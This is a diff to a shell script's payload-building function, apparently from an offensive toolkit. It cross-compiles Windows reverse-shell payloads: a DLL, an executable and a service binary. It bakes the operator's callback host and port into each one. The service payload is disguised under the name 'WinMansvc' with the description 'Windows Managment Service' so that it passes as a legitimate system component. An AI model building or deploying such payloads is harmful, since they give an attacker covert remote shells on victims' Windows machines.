@@ -41,11 +41,8 @@ get_ip_address() {
 compile_payloads() {
     echo -e "\n${M}COMPILING${W}"
     echo -e "${LG}==============================================${W}"
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/win/src/cppdll_shell.cpp
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/win/src/winshell.c
-
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/win/cppdll_shell.dll -lws2_32
-    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/winshell.c -o /home/$USER/auto/payloads/win/winshell.exe -lws2_32
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/win/cppdll_shell.dll -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/winshell.c -o /home/$USER/auto/payloads/win/winshell.exe -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
 
     x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/win/src/rs_service/main.c /home/$USER/auto/payloads/win/src/rs_service/service.c /home/$USER/auto/payloads/win/src/rs_service/shell.c -o /home/$USER/auto/payloads/win/rs_service.exe \
     -DSERVER_HOST=L"\"$lhost\"" -DSERVER_PORT=L"\"$lport\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
